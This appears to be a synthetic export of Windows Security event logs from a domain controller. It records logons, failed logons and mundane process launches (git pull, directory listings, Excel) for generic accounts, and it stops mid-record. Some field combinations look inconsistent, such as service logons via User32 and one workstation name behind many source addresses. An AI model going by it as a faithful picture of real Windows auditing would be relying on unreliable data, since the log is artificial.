Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 12:15:00 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\svc_report
	Account Name:	svc_report
	Account Domain:	CORP
	Logon ID:	0x98269
	Logon Type:	5
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.22
	Source Port:	58142
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 12:15:26 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	New Process ID:	0x8A3B
	New Process Name:	C:\Program Files\Git\bin\git.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	git.exe pull

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 12:25:18 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	New Process ID:	0x4E93
	New Process Name:	C:\Program Files\Git\bin\git.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	git.exe pull

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 12:26:56 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	Logon ID:	0xE98CD7
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.21
	Source Port:	41956
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 12:27:59 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	Logon ID:	0xEFD6A1
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.21
	Source Port:	50014
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 12:28:06 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	New Process ID:	0xEAD1
	New Process Name:	C:\Windows\System32\taskhostw.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	taskhostw.exe

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 12:35:00 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\svc_web
	Account Name:	svc_web
	Account Domain:	CORP
	Logon ID:	0xC33962
	Logon Type:	5
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.22
	Source Port:	54454
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 12:53:33 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	Logon ID:	0x347757
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.11
	Source Port:	54954
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 12:57:56 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	New Process ID:	0x28BA
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	cmd.exe /c dir Z:\reports

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 1:18:58 PM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	administrator
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.45
	Source Port:	49692
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 1:20:30 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	Logon ID:	0x5C1ED3
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.22
	Source Port:	40080
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 1:21:01 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	Logon ID:	0xF84360
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.30
	Source Port:	48916
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 1:22:58 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	New Process ID:	0xF52A
	New Process Name:	C:\Program Files\Git\bin\git.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	git.exe pull

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 1:24:00 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	New Process ID:	0x399F
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	cmd.exe /c dir Z:\reports

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 1:32:37 PM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	bob
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.45
	Source Port:	45861
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 1:33:00 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\svc_web
	Account Name:	svc_web
	Account Domain:	CORP
	Logon ID:	0x24E1BA
	Logon Type:	5
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.21
	Source Port:	50436
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 1:36:14 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	Logon ID:	0xBDB78C
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.20
	Source Port:	35097
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 1:39:08 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	Logon ID:	0xCC638D
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.10
	Source Port:	48644
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 1:44:03 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	Logon ID:	0x3252B9
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.10
	Source Port:	44821
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 1:44:48 PM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	carol
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.11
	Source Port:	51094
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 1:50:16 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	Logon ID:	0xF522DF
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.12
	Source Port:	35610
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 1:50:35 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	Logon ID:	0xCBB452
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.20
	Source Port:	57913
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 1:52:16 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	Logon ID:	0x649D0
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.15
	Source Port:	56377
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 1:57:21 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	New Process ID:	0x9483
	New Process Name:	C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	EXCEL.EXE /dde

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 1:59:10 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	Logon ID:	0x9194E6
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.11
	Source Port:	40298
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 2:03:40 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	Logon ID:	0xB0C751
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.31
	Source Port:	59985
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 2:13:00 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\svc_report
	Account Name:	svc_report
	Account Domain:	CORP
	Logon ID:	0xAAC04C
	Logon Type:	5
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.12
	Source Port:	37963
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 2:13:35 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	Logon ID:	0x330F0
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.21
	Source Port:	56063
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 2:28:53 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	New Process ID:	0xEDF8
	New Process Name:	C:\Program Files\Git\bin\git.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	git.exe pull

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 2:36:00 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\svc_web
	Account Name:	svc_web
	Account Domain:	CORP
	Logon ID:	0x7DE1A7
	Logon Type:	5
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.31
	Source Port:	47274
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 2:40:02 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	New Process ID:	0xB299
	New Process Name:	C:\Windows\System32\taskhostw.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	taskhostw.exe

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 2:45:31 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	Logon ID:	0xCE941
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.20
	Source Port:	54456
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 2:49:00 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\svc_report
	Account Name:	svc_report
	Account Domain:	CORP
	Logon ID:	0xB78C2F
	Logon Type:	5
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.12
	Source Port:	36962
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 2:54:50 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	New Process ID:	0xF166
	New Process Name:	C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	EXCEL.EXE /dde

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 2:55:12 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	New Process ID:	0xA2F4
	New Process Name:	C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	EXCEL.EXE /dde

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 2:57:51 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	New Process ID:	0xA42C
	New Process Name:	C:\Program Files\Git\bin\git.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	git.exe pull

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 3:04:26 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	Logon ID:	0x8C39D6
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.15
	Source Port:	32205
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 3:05:04 PM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	alice
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.10
	Source Port:	50092
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 3:08:25 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	New Process ID:	0x7BD
	New Process Name:	C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	EXCEL.EXE /dde

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 3:09:00 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\svc_web
	Account Name:	svc_web
	Account Domain:	CORP
	Logon ID:	0x3C9921
	Logon Type:	5
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.31
	Source Port:	42629
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 3:13:16 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	New Process ID:	0xC342
	New Process Name:	C:\Program Files\Git\bin\git.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	git.exe pull

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 3:15:14 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	Logon ID:	0x6E10D8
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.45
	Source Port:	39420
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 3:17:05 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	New Process ID:	0x781E
	New Process Name:	C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	EXCEL.EXE /dde

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 3:20:15 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	Logon ID:	0x708063
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.45
	Source Port:	47708
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 3:26:29 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	Logon ID:	0x87485F
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.15
	Source Port:	36061
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 3:31:18 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	Logon ID:	0xC60471
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.21
	Source Port:	31437
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 3:33:32 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\alice
	Account Name:	alice
	Account Domain:	CORP
	Logon ID:	0x85B568
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.22
	Source Port:	45977
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 3:39:13 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	Logon ID:	0xCCD111
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.50
	Source Port:	40185
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 3:40:03 PM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	administrator
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.11
	Source Port:	41548
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 3:42:03 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\administrator
	Account Name:	administrator
	Account Domain:	CORP
	Logon ID:	0xA801CF
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.50
	Source Port:	58305
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 3:44:45 PM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	bob
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.31
	Source Port:	42840
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 3:45:09 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	Logon ID:	0xBB5D75
	Logon Type:	2
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.20
	Source Port:	35429
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 3:47:08 PM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	carol
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.21
	Source Port:	38639
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 3:47:55 PM
Event ID:      4625
Task Category: Logon
Level:         Information
Keywords:      Audit Failure
Computer:      DC01.corp.local
Description:
An account failed to log on.

	Security ID:	NULL SID
	Account Name:	-
	Account For Which Logon Failed:	
	Account Name:	carol
	Account Domain:	CORP
	Failure Reason:	Unknown user name or bad password.
	Status:	0xC000006D
	Sub Status:	0xC000006A
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.10
	Source Port:	34460
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 3:53:00 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\svc_web
	Account Name:	svc_web
	Account Domain:	CORP
	Logon ID:	0xB1AC56
	Logon Type:	5
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.45
	Source Port:	30094
	Logon Process:	User32
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 4:02:51 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
	Account Domain:	CORP
	Logon ID:	0xE0A946
	Logon Type:	3
	Workstation Name:	WS-CORP
	Source Network Address:	192.168.1.21
	Source Port:	31757
	Logon Process:	NtLmSsp
	Authentication Package:	NTLM

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 4:03:11 PM
Event ID:      4688
Task Category: Process Creation
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
A new process has been created.

	Security ID:	CORP\bob
	Account Name:	bob
	Account Domain:	CORP
	New Process ID:	0x70A8
	New Process Name:	C:\Program Files\Git\bin\git.exe
	Token Elevation Type:	%%1936
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	git.exe pull

Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          9/18/2026 4:15:05 PM
Event ID:      4624
Task Category: Logon
Level:         Information
Keywords:      Audit Success
Computer:      DC01.corp.local
Description:
An account was successfully logged on.

	Security ID:	CORP\carol
	Account Name:	carol
